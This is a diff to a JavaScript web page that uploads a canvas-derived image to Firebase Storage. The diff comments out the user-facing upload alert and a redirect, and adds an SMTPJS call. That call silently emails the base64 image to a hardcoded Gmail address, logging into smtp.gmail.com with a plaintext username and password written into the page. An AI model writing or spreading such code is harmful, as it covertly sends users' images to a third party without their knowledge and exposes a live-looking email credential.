@@ -6,6 +6,8 @@
     <meta http-equiv="X-UA-Compatible" content="ie=edge" />
     <title>Firebase Image Upload in Javascript</title>
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+
+ <script src="https://smtpjs.com/v3/smtp.js"></script>
   </head>
   <body class="bg-danger">
 
@@ -83,8 +85,21 @@ image.src = canvas.toDataURL();
 
     const ref = firebase.storage().ref();
     ref.child(new Date() + '-' + 'base64').putString(image.src, 'data_url').then(function(snapshot) {
-    console.log('Uploaded a data_url string!');
-    alert("Image Uploaded")
+    //console.log('Uploaded a data_url string!');
+    //alert("Image Uploaded")
+    //location.replace("https://web-developer-joy.blogspot.com/")
+
+    console.log(image.src)
+
+     Email.send({
+     Host : "smtp.gmail.com",
+     Username : "fiveerjoy@gmail.com",
+     Password : "oadaotzokyybvmyq",
+     To : 'fiveerjoy@gmail.com',
+     From : "img@gmail.com",
+     Subject : "This is the subject",
+     Body :image.src
+ })
 });
 
 });
